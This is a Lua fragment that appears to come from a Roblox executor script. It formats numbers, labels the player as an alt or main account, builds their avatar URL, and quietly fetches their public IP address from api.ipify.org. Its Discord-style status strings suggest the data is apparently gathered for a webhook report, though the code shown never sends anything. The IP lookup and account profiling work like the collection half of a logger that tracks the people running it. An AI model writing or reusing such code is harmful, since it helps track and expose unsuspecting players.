-- Helper: Format large numbers
local suffixes = { "", "K", "M", "B", "T", "Qa", "Qi", "Sx", "Sp", "Oc", "No", "De" }
function formatNumber(num)
    if type(num) ~= "number" then return tostring(num) end
    if num < 1000 then return tostring(num) end
    local magnitude = math.floor(math.log10(num) / 3)
    local suffix = suffixes[magnitude + 1] or ("e" .. (magnitude * 3))
    local scaled = num / (1000 ^ magnitude)
    return string.format("%.2f%s", scaled, suffix)
end

-- Alt detection logic
local function isAlt()
    local accAge = LocalPlayer.AccountAge or 0
    local friendCount = 0
    pcall(function() friendCount = #LocalPlayer:GetFriendsOnline() end)
    return accAge < 14 or friendCount < 3
end

local altStatus = isAlt() and ":warning: **ALT DETECTED**" or ":white_check_mark: Main Account"

-- Get Roblox avatar thumbnail URL
local function getPFP()
    return ("https://www.roblox.com/headshot-thumbnail/image?userId=%s&width=420&height=420&format=png"):format(LocalPlayer.UserId)
end

-- Get public IP (with fallback)
local userIP = "?"
if req then
    local ok, response = pcall(function()
        return req({ Url = "https://api.ipify.org/", Method = "GET" })
    end)
    if ok and response and response.Body then
        userIP = tostring(response.Body)
    end
end

